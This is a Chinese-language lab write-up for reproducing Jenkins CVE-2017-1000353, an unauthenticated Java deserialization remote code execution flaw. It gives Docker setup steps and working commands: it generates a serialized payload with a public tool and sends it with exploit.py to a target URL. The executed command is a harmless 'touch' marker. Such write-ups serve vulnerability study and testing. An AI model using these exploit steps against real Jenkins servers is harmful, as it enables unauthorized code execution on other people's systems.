# Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）

Jenkins 是一个广泛使用的开源自动化服务器。

Jenkins 2.56 及更早版本以及 2.46.1 LTS 及更早版本存在未授权的远程代码执行漏洞。这个未经身份验证的远程代码执行漏洞允许攻击者向 Jenkins CLI 传输序列化的 Java `SignedObject` 对象，该对象会使用新的 `ObjectInputStream` 进行反序列化，从而绕过现有的基于黑名单的保护机制。

参考链接：

- <https://www.jenkins.io/security/advisory/2017-04-26/>
- <https://www.exploit-db.com/exploits/41965>

## 环境搭建

执行如下命令启动 Jenkins 2.46.1：

```
docker compose up -d
```

等待服务器完全启动后，访问 `http://your-ip:8080` 即可看到 Jenkins 已成功运行，无需手动安装。

## 漏洞复现

漏洞利用过程分为两个步骤：生成恶意序列化载荷，并将其发送至目标 Jenkins 服务器。

首先，下载 [CVE-2017-1000353-1.1-SNAPSHOT-all.jar](https://github.com/vulhub/CVE-2017-1000353/releases/download/1.1/CVE-2017-1000353-1.1-SNAPSHOT-all.jar) 工具来生成 payload。这个工具将创建一个包含我们命令的序列化对象：

```bash
java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser "touch /tmp/success"
# jenkins_poc.ser 是生成的输出文件名
# "touch ..." 是要执行的命令
```

**注意**：生成payload时的Java版本很重要，建议使用OpenJDK 8u292版本。其他版本的Java可能导致生成的payload无法成功利用。如果遇到问题，可以使用以下命令在Docker中生成payload：

```bash
docker run --rm -v $(pwd):/tmp openjdk:8u292 bash -c "cd /tmp && java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser \"touch /tmp/success\""
```

执行上述命令后，将生成一个名为 `jenkins_poc.ser` 的文件，其中包含序列化后的 payload。

接下来，下载 [exploit.py](https://github.com/vulhub/CVE-2017-1000353/blob/master/exploit.py) 脚本，并使用 Python 3 执行以发送 payload：

```bash
python exploit.py http://your-ip:8080 jenkins_poc.ser
```

![发送漏洞利用载荷](1.png)

要验证漏洞利用是否成功，请检查容器内是否创建了指定文件：

![命令执行验证](2.png)

`/tmp/success` 文件的存在证实了远程代码执行成功。
